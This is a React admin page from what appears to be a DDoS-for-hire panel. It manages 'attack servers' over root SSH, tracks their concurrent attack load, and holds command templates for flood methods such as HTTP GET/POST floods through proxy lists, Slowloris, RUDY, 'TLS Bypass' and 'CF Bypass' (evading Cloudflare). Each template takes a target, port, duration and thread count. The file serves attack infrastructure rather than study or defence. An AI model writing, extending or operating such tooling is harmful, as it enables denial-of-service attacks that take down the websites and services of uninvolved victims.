import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { toast } from "sonner";
import axios from "axios";
import { API } from "../App";
import Layout from "../components/Layout";
import { Button } from "../components/ui/button";
import { Input } from "../components/ui/input";
import { Label } from "../components/ui/label";
import { Switch } from "../components/ui/switch";
import { Textarea } from "../components/ui/textarea";
import { 
  Server, Plus, Trash2, RefreshCw, Settings, Activity, Save, Wifi, WifiOff, Cpu, HardDrive, Terminal
} from "lucide-react";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "../components/ui/dialog";

const AVAILABLE_METHODS = [
  { id: "HTTP-GET", name: "HTTP GET", placeholder: "./flood {target} {port} {duration} {threads} GET proxy.txt" },
  { id: "HTTP-POST", name: "HTTP POST", placeholder: "./flood {target} {port} {duration} {threads} POST proxy.txt" },
  { id: "HTTP-HEAD", name: "HTTP HEAD", placeholder: "./head {target} {port} {duration} {threads}" },
  { id: "SLOWLORIS", name: "Slowloris", placeholder: "./slowloris {target} {port} {duration}" },
  { id: "TLS-BYPASS", name: "TLS Bypass", placeholder: "./tls {target} {port} {duration} {threads}" },
  { id: "CF-BYPASS", name: "CF Bypass", placeholder: "./cfbypass {target} {duration} {threads} proxy.txt" },
  { id: "BROWSER-EMU", name: "Browser", placeholder: "./browser {target} {duration} proxy.txt" },
  { id: "RUDY", name: "RUDY", placeholder: "./rudy {target} {port} {duration}" }
];

export default function AdminServers() {
  const [servers, setServers] = useState([]);
  const [settings, setSettings] = useState({ global_max_concurrent: 500, maintenance_mode: false });
  const [loading, setLoading] = useState(true);
  const [addDialogOpen, setAddDialogOpen] = useState(false);
  const token = localStorage.getItem("token");

  const [newServer, setNewServer] = useState({
    name: "",
    host: "",
    ssh_port: 22,
    ssh_user: "root",
    ssh_key: "",
    ssh_password: "",
    max_concurrent: 100,
    method_commands: []
  });

  useEffect(() => {
    fetchData();
  }, []);

  const fetchData = async () => {
    try {
      const [serversRes, settingsRes] = await Promise.all([
        axios.get(`${API}/admin/servers`, { headers: { Authorization: `Bearer ${token}` } }),
        axios.get(`${API}/admin/settings`, { headers: { Authorization: `Bearer ${token}` } })
      ]);
      setServers(serversRes.data);
      setSettings(settingsRes.data);
    } catch (err) {
      toast.error("Failed to load data");
    } finally {
      setLoading(false);
    }
  };

  const handleAddServer = async () => {
    if (!newServer.name || !newServer.host || newServer.method_commands.length === 0) {
      toast.error("Enter name, host, and at least one method command");
      return;
    }

    try {
      await axios.post(`${API}/admin/servers`, newServer, {
        headers: { Authorization: `Bearer ${token}` }
      });
      toast.success("Server added");
      setAddDialogOpen(false);
      setNewServer({
        name: "", host: "", ssh_port: 22, ssh_user: "root",
        ssh_key: "", ssh_password: "", max_concurrent: 100,
        method_commands: []
      });
      fetchData();
    } catch (err) {
      toast.error(err.response?.data?.detail || "Failed");
    }
  };

  const handleDeleteServer = async (serverId) => {
    if (!window.confirm("Delete this server?")) return;
    try {
      await axios.delete(`${API}/admin/servers/${serverId}`, {
        headers: { Authorization: `Bearer ${token}` }
      });
      toast.success("Server deleted");
      fetchData();
    } catch (err) {
      toast.error("Failed");
    }
  };

  const handlePingServer = async (serverId) => {
    try {
      const res = await axios.post(`${API}/admin/servers/${serverId}/ping`, {}, {
        headers: { Authorization: `Bearer ${token}` }
      });
      toast.success(`Status: ${res.data.status}, CPU: ${res.data.cpu_usage}%, RAM: ${res.data.ram_used}GB`);
      fetchData();
    } catch (err) {
      toast.error("Failed");
    }
  };

  const handleToggleServer = async (server) => {
    try {
      await axios.put(`${API}/admin/servers/${server.id}`, 
        { is_active: !server.is_active },
        { headers: { Authorization: `Bearer ${token}` } }
      );
      toast.success(server.is_active ? "Disabled" : "Enabled");
      fetchData();
    } catch (err) {
      toast.error("Failed");
    }
  };

  const handleUpdateSettings = async () => {
    try {
      await axios.put(`${API}/admin/settings`, settings, {
        headers: { Authorization: `Bearer ${token}` }
      });
      toast.success("Settings saved");
    } catch (err) {
      toast.error("Failed");
    }
  };

  const updateMethodCommand = (methodId, command) => {
    setNewServer(prev => {
      const existing = prev.method_commands.find(mc => mc.method_id === methodId);
      if (existing) {
        if (command === "") {
          return { ...prev, method_commands: prev.method_commands.filter(mc => mc.method_id !== methodId) };
        }
        return {
          ...prev,
          method_commands: prev.method_commands.map(mc => 
            mc.method_id === methodId ? { ...mc, command } : mc
          )
        };
      } else if (command !== "") {
        return { ...prev, method_commands: [...prev.method_commands, { method_id: methodId, command }] };
      }
      return prev;
    });
  };

  const getMethodCommand = (methodId) => {
    return newServer.method_commands.find(mc => mc.method_id === methodId)?.command || "";
  };

  const getLoadPercent = (load, max) => Math.min((load / max) * 100, 100);
  const getLoadColor = (percent) => {
    if (percent < 50) return "bg-panel-success";
    if (percent < 80) return "bg-panel-warning";
    return "bg-panel-danger";
  };

  if (loading) {
    return (
      <Layout>
        <div className="flex items-center justify-center h-96">
          <div className="w-8 h-8 border-2 border-panel-primary border-t-transparent rounded-full animate-spin" />
        </div>
      </Layout>
    );
  }

  return (
    <Layout>
      <div data-testid="admin-servers" className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-2xl font-bold text-panel flex items-center gap-3">
              <Server className="w-7 h-7 text-panel-primary" />
              Attack Servers
            </h1>
            <p className="text-panel-muted text-sm mt-1">Manage dedicated attack servers and commands</p>
          </div>
          
          <div className="flex items-center gap-2">
            <Button onClick={fetchData} variant="ghost" className="text-panel-muted hover:text-panel-primary rounded-lg">
              <RefreshCw className="w-5 h-5" />
            </Button>
            
            <Dialog open={addDialogOpen} onOpenChange={setAddDialogOpen}>
              <DialogTrigger asChild>
                <Button className="bg-panel-primary hover:bg-panel-primary/90 text-white rounded-lg">
                  <Plus className="w-4 h-4 mr-2" />
                  Add Server
                </Button>
              </DialogTrigger>
              <DialogContent className="bg-panel-surface border-panel max-w-2xl max-h-[85vh] overflow-y-auto rounded-xl">
                <DialogHeader>
                  <DialogTitle className="text-panel">Add Attack Server</DialogTitle>
                  <DialogDescription className="text-panel-muted">
                    Configure server connection and attack commands
                  </DialogDescription>
                </DialogHeader>
                
                <div className="space-y-5 py-4">
                  {/* Server Info */}
                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label className="text-xs text-panel-muted">Server Name</Label>
                      <Input
                        value={newServer.name}
                        onChange={(e) => setNewServer(prev => ({ ...prev, name: e.target.value }))}
                        placeholder="EU-Server-1"
                        className="bg-panel-hover border-panel text-panel rounded-lg"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs text-panel-muted">Host/IP</Label>
                      <Input
                        value={newServer.host}
                        onChange={(e) => setNewServer(prev => ({ ...prev, host: e.target.value }))}
                        placeholder="192.168.1.100"
                        className="bg-panel-hover border-panel text-panel rounded-lg"
                      />
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-3 gap-4">
                    <div className="space-y-2">
                      <Label className="text-xs text-panel-muted">SSH Port</Label>
                      <Input
                        type="number"
                        value={newServer.ssh_port}
                        onChange={(e) => setNewServer(prev => ({ ...prev, ssh_port: parseInt(e.target.value) || 22 }))}
                        className="bg-panel-hover border-panel text-panel rounded-lg"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs text-panel-muted">SSH User</Label>
                      <Input
                        value={newServer.ssh_user}
                        onChange={(e) => setNewServer(prev => ({ ...prev, ssh_user: e.target.value }))}
                        className="bg-panel-hover border-panel text-panel rounded-lg"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs text-panel-muted">Max Concurrent</Label>
                      <Input
                        type="number"
                        value={newServer.max_concurrent}
                        onChange={(e) => setNewServer(prev => ({ ...prev, max_concurrent: parseInt(e.target.value) || 100 }))}
                        className="bg-panel-hover border-panel text-panel rounded-lg"
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <Label className="text-xs text-panel-muted">SSH Password</Label>
                    <Input
                      type="password"
                      value={newServer.ssh_password}
                      onChange={(e) => setNewServer(prev => ({ ...prev, ssh_password: e.target.value }))}
                      placeholder="Leave empty for SSH key"
                      className="bg-panel-hover border-panel text-panel rounded-lg"
                    />
                  </div>
                  
                  {/* Method Commands */}
                  <div className="space-y-3">
                    <div className="flex items-center gap-2">
                      <Terminal className="w-4 h-4 text-panel-primary" />
                      <Label className="text-sm font-medium text-panel">Attack Commands</Label>
                    </div>
                    <p className="text-xs text-panel-muted">
                      Define custom commands for each method. Use placeholders: {"{target}"}, {"{port}"}, {"{duration}"}, {"{threads}"}
                    </p>
                    
                    <div className="space-y-3">
                      {AVAILABLE_METHODS.map((method) => (
                        <div key={method.id} className="space-y-1">
                          <Label className="text-xs text-panel-muted">{method.name}</Label>
                          <Input
                            value={getMethodCommand(method.id)}
                            onChange={(e) => updateMethodCommand(method.id, e.target.value)}
                            placeholder={method.placeholder}
                            className="bg-panel-hover border-panel text-panel font-mono text-sm rounded-lg"
                          />
                        </div>
                      ))}
                    </div>
                  </div>
                  
                  <Button 
                    onClick={handleAddServer}
                    className="w-full bg-panel-primary hover:bg-panel-primary/90 text-white rounded-lg"
                  >
                    Add Server
                  </Button>
                </div>
              </DialogContent>
            </Dialog>
          </div>
        </div>

        {/* Global Settings */}
        <div className="bg-panel-surface rounded-xl p-5 border border-panel">
          <h3 className="text-sm font-semibold text-panel mb-4 flex items-center gap-2">
            <Settings className="w-4 h-4 text-panel-primary" />
            Global Settings
          </h3>
          
          <div className="grid md:grid-cols-3 gap-4 items-end">
            <div className="space-y-2">
              <Label className="text-xs text-panel-muted">Max Global Concurrent</Label>
              <Input
                type="number"
                value={settings.global_max_concurrent}
                onChange={(e) => setSettings(prev => ({ ...prev, global_max_concurrent: parseInt(e.target.value) || 500 }))}
                className="bg-panel-hover border-panel text-panel rounded-lg"
              />
            </div>
            
            <div className="flex items-center gap-3">
              <Switch
                checked={settings.maintenance_mode}
                onCheckedChange={(checked) => setSettings(prev => ({ ...prev, maintenance_mode: checked }))}
              />
              <span className="text-sm text-panel">Maintenance Mode</span>
              {settings.maintenance_mode && (
                <span className="text-xs text-panel-danger font-medium">ACTIVE</span>
              )}
            </div>
            
            <Button onClick={handleUpdateSettings} className="bg-panel-success hover:bg-panel-success/90 text-white rounded-lg">
              <Save className="w-4 h-4 mr-2" />
              Save
            </Button>
          </div>
        </div>

        {/* Servers List */}
        <div className="space-y-4">
          {servers.length === 0 ? (
            <div className="bg-panel-surface rounded-xl p-12 text-center border border-panel">
              <Server className="w-12 h-12 text-panel-muted mx-auto mb-4" />
              <p className="text-panel-muted">No servers configured</p>
              <p className="text-panel-muted text-sm">Add a server to start</p>
            </div>
          ) : (
            servers.map((server, idx) => {
              const loadPercent = getLoadPercent(server.current_load || 0, server.max_concurrent);
              const methods = server.method_commands?.map(mc => mc.method_id) || [];
              
              return (
                <motion.div
                  key={server.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: idx * 0.05 }}
                  className={`bg-panel-surface rounded-xl p-5 border ${
                    server.is_active ? "border-panel" : "border-panel opacity-60"
                  }`}
                >
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <div className={`w-3 h-3 rounded-full ${
                        server.status === "online" ? "bg-panel-success animate-pulse" : "bg-panel-danger"
                      }`} />
                      <div>
                        <h3 className="font-semibold text-panel">{server.name}</h3>
                        <p className="font-mono text-sm text-panel-muted">{server.host}:{server.ssh_port}</p>
                      </div>
                    </div>
                    
                    <div className="flex items-center gap-1">
                      <Button
                        onClick={() => handlePingServer(server.id)}
                        variant="ghost"
                        size="sm"
                        className="text-panel-muted hover:text-panel-primary rounded-lg"
                        title="Ping server"
                      >
                        {server.status === "online" ? <Wifi className="w-4 h-4" /> : <WifiOff className="w-4 h-4" />}
                      </Button>
                      <Button
                        onClick={() => handleToggleServer(server)}
                        variant="ghost"
                        size="sm"
                        className={`rounded-lg ${server.is_active ? "text-panel-success" : "text-panel-muted"}`}
                        title={server.is_active ? "Disable" : "Enable"}
                      >
                        <Activity className="w-4 h-4" />
                      </Button>
                      <Button
                        onClick={() => handleDeleteServer(server.id)}
                        variant="ghost"
                        size="sm"
                        className="text-panel-muted hover:text-panel-danger rounded-lg"
                        title="Delete"
                      >
                        <Trash2 className="w-4 h-4" />
                      </Button>
                    </div>
                  </div>
                  
                  {/* Stats Grid */}
                  <div className="grid grid-cols-2 md:grid-cols-5 gap-4 mb-4">
                    <div>
                      <p className="text-xs text-panel-muted">Status</p>
                      <p className={`text-sm font-medium ${server.status === "online" ? "text-panel-success" : "text-panel-danger"}`}>
                        {server.status || "Unknown"}
                      </p>
                    </div>
                    <div>
                      <p className="text-xs text-panel-muted">SSH User</p>
                      <p className="text-sm font-mono text-panel">{server.ssh_user}</p>
                    </div>
                    <div>
                      <p className="text-xs text-panel-muted">Max Concurrent</p>
                      <p className="text-sm font-mono text-panel">{server.max_concurrent}</p>
                    </div>
                    <div className="flex items-center gap-2">
                      <Cpu className="w-4 h-4 text-panel-muted" />
                      <div>
                        <p className="text-xs text-panel-muted">CPU</p>
                        <p className="text-sm font-mono text-panel">{server.cpu_usage || 0}%</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-2">
                      <HardDrive className="w-4 h-4 text-panel-muted" />
                      <div>
                        <p className="text-xs text-panel-muted">RAM</p>
                        <p className="text-sm font-mono text-panel">{server.ram_used || 0}/{server.ram_total || 0}GB</p>
                      </div>
                    </div>
                  </div>
                  
                  {/* Load bar */}
                  <div className="mb-4">
                    <div className="flex justify-between text-xs text-panel-muted mb-1">
                      <span>Current Load</span>
                      <span>{server.current_load || 0} / {server.max_concurrent}</span>
                    </div>
                    <div className="h-2 bg-panel-hover rounded-full overflow-hidden">
                      <div 
                        className={`h-full ${getLoadColor(loadPercent)} transition-all`}
                        style={{ width: `${loadPercent}%` }}
                      />
                    </div>
                  </div>
                  
                  {/* Methods */}
                  <div>
                    <p className="text-xs text-panel-muted mb-2">Configured Methods ({methods.length})</p>
                    <div className="flex flex-wrap gap-2">
                      {methods.map((method, i) => (
                        <span key={i} className="px-2 py-1 text-xs font-mono bg-panel-hover rounded text-panel-primary">
                          {method}
                        </span>
                      ))}
                    </div>
                  </div>
                  
                  {/* Commands Preview */}
                  {server.method_commands?.length > 0 && (
                    <div className="mt-4 pt-4 border-t border-panel">
                      <p className="text-xs text-panel-muted mb-2 flex items-center gap-1">
                        <Terminal className="w-3 h-3" />
                        Commands
                      </p>
                      <div className="space-y-1 max-h-32 overflow-y-auto">
                        {server.method_commands.map((mc, i) => (
                          <div key={i} className="text-xs font-mono bg-panel-hover p-2 rounded text-panel-muted">
                            <span className="text-panel-primary">{mc.method_id}:</span> {mc.command}
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </motion.div>
              );
            })
          )}
        </div>
      </div>
    </Layout>
  );
}
